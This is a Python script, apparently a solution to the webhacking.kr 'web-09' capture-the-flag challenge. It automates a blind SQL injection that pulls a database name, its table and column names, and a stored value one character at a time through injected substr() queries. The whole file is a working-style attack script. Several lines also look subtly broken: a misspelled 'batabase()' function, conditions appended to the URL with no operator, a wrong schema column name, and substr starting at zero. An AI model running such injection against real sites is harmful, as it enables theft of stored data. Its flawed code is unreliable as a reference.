import requests

def getflag(sel=None, dbn=None, tbn=None, coln=None):

    url = 'https://webhacking.kr/challenge/web-09/index.php?no=1'
    keys = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'
    val = ''

    for i in range(20):
        for key in keys:
            if sel == 1:
                tmp = url + 'substr((select batabase()), {}, 1) = {}'.format(i, key)
            elif sel == 2:
                tmp = url + 'substr((select group_concat(table_name) from information_schema.tables where table_schema = "{}"), {}, 1) = "{}"'.format(dbn, i, key)
            elif sel == 3:
                tmp = url + 'substr((select group_concat(column_name) from information_schema.columns where column_schema = "{}"), {}, 1) = "{}"'.format(dbn, i, key)
            elif sel == 4:
                tmp = url + 'substr((select {} from {}), {}, 1) = "{}"'.format(coln, tbn, i, key)

            res = requests.get(url=tmp)
            if 'Apple' in res.text:
                val += key
                print(val)
                break
            if key == '0':
                return val

if __name__ == '__main__':

    dbn = getflag(sel=1)
    tbn = getflag(sel=2, dbn=dbn)
    coln = getflag(sel=3, dbn=dbn)
    val = getflag(sel=4, tbn=tbn, coln=coln)

    print(val)